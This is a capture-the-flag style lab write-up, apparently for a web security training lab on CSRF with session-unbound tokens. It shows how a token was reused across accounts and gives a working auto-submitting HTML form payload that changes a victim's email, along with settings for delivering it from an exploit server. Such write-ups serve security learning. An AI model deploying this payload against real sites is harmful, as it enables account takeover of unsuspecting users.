### CSRF where token is not tied to user session

This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

wiener:peter
carlos:montoya

_____

Analysis and Exploit:

1. Logged-in as user _wiener_, session cookie = JT6zipN2IJHtqauXXHMyjsRmYkE5OKH4  and csrf token = Jfx4ZE9LHZ1k36UBWv683Wtnso4eZTLM

2. Logged-in as user _carlos_, session cookie = 1hTMTZRfVuNjTbCQ7iqbmJNRoEFlkOxJ and csrf token = gGltaSQ1XtFxa2XfP10bpcZwHsuRCZAO

3. Changed email for user _carlos_, captured the POST request, changed the csrf token with _wiener_'s and repeated it using [BURP REPEATER]: worked  
Since csrf tokens are not tied to session cookies, the web application does consider valid tokens that are stored in a common pool.

4. Craft HTML form page with payload*, stored on exploit server and delivered to the victim:
```html
<html>
    <body>
        <form action="URL/my-account/change-email" method="POST">
            <input required type="email" name="email" value="victim@gothacked">
            <input required type="hidden" name="csrf" value="CSRF">
            <button type="submit">Update Email</button>
        </form>
        <script>document.forms[0].submit()</script>
    </body>
</html>
```


_____

Script notes:

- 1 - Login as user _wiener_ and grab the csrf token
- 4 - payload[URL] = url, payload[CSRF] = csrf  
    Params for the exploit server:
    - urlIsHttps: on
    - responseFile: /exploit
    - responseHead: HTTP/1.1 200 OK Content-Type: text/html; charset=utf-8
    - responseBody: *
    - formAction: STORE | DELIVER_TO_VICTIM